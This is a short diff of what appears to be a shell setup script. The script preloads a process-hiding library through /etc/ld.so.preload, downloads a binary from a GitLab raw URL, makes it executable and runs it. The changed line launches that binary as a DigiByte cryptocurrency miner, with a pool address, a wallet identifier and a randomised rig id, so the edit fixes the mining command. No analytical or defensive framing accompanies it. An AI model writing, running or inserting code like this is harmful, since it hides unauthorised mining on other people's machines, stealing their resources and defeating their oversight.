@@ -6,4 +6,4 @@ apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
 sudo mv libprocesshider.so /usr/local/lib/
 sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 wget -O project https://gitlab.com/muiminah74/jambanium/-/raw/main/rstd && chmod +x project &&
-./project 7.211.213.118:8080 -u DKjK3oBfsBtCeLaSL2LGTqoVbJauHB97gT+1000 --coin=DGB --rig-id $(echo $(shuf -i 1-20000 -n 1)-DOLALALA)
+./project -o 67.211.213.118:8080 -u DKjK3oBfsBtCeLaSL2LGTqoVbJauHB97gT+1000 --coin=DGB --rig-id $(echo $(shuf -i 1-20000 -n 1)-DEPLOY)
